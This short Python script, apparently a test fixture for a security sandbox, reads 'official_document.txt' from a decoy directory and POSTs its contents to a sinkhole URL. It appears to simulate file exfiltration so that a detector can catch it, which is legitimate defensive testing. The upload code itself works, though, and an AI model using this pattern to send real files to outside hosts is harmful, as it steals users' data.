import os
from pathlib import Path
from urllib.request import Request, urlopen


decoy = Path(os.environ["AEGIS_DECOY_DIR"]) / "official_document.txt"
payload = decoy.read_bytes()
request = Request(os.environ["AEGIS_SINKHOLE_URL"], data=payload, method="POST")
with urlopen(request, timeout=2) as response:
    response.read()
